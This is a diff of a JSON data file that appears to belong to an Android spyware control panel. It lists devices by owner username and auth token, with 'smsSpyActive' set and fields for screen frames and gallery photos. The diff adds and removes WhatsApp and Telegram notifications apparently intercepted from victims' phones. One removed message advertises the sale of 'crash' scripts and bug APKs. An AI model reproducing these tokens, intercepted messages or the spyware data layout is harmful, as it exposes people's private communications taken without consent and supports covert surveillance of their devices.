@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776773409885,
+    "lastSeen": 1776773427605,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776773411931,
+    "lastSeen": 1776773426952,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776773411965,
+    "lastSeen": 1776773425959,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "",
+        "content": "Telepon suara grup berlangsung",
+        "time": "21/04 19:10",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773428445
+      },
       {
         "appName": "WhatsApp",
         "sender": "Nanat",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:16",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776770201333
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Hàblàr sobrè la muèrte",
-        "content": "🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🖤𝗕𝗘𝗡𝗘𝗙𝗜𝗧 𝗨𝗧𝗔𝗠𝗔🎀\n𝗝𝗮𝗺𝗶𝗻𝗮𝗻 𝘀𝗮𝗺𝗮 𝗴𝘂𝗮 𝗣𝗧 𝗱𝗶 𝘂𝗿𝘂𝘀 𝗮𝗻𝘁𝗶 𝗯𝗹 𝗮𝘀𝗮𝗹-𝗮𝘀𝗮𝗹𝗮𝗻 𝗸𝗲𝗰𝘂𝗮𝗹𝗶 𝗹𝘂 𝗿𝗶𝗽,𝘁𝗲𝗿𝘂𝘀 𝗯𝗮𝗸𝗮𝗹 𝗴𝘂𝗮 𝗽𝗿𝗼𝗺𝗼𝘀𝗶𝗶𝗻 𝗹𝘂 𝗱𝗶 𝗮𝗹𝗹 𝗰𝗵𝗮𝗻𝗲𝗹 𝗱𝗮𝗻 𝘀𝘁𝗼𝗿𝘆📣\n\n🔠🔠🔠🔠🔠🔠\n🔠🔠🔠❗️\nHARGA PT VIP? 13K💰\n𝗕𝗘𝗡𝗘𝗙𝗜𝗧 𝗦𝗖 𝗔𝗧𝗔𝗨 𝗔𝗣𝗞 𝗕𝗨𝗚 🔥\n𐙚˚࿔get owner sc nted crash\n𐙚˚࿔get patner sc sakata\n𐙚˚࿔get patner grely sited\n𐙚˚࿔get reseller sc galaxy invictus \n𐙚˚࿔get reseller sc corrosent\n𐙚˚࿔get reseller sc morosewave \n𐙚˚࿔get reseller sc x-forcecrash \n𐙚˚࿔get reseller sc fyterxx \n𐙚˚࿔get reseller sc fluxora core\n𐙚˚࿔get reseller sc tenebrax velcron\n𐙚˚࿔get reseller sc dark angel \n𐙚˚࿔get reseller sc viper invictus \n𐙚˚࿔get reseller sc demonic crash\n𐙚˚࿔get reseller sc creepy\n𐙚˚࿔get reseller sc nexyra invictus \n𐙚˚࿔get reseller sc inferno x\n𐙚˚࿔get reseller sc x flowers\n𐙚˚࿔get reseller sc vzentra\n𐙚˚࿔get reseller sc onyx\n𐙚˚࿔get reseller apk murvyx\n𐙚˚࿔get member apk toxic shadow \n𐙚˚࿔get member apk ",
-        "time": "21/04 18:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776770201192
       }
     ],
     "galleryPhotos": [],
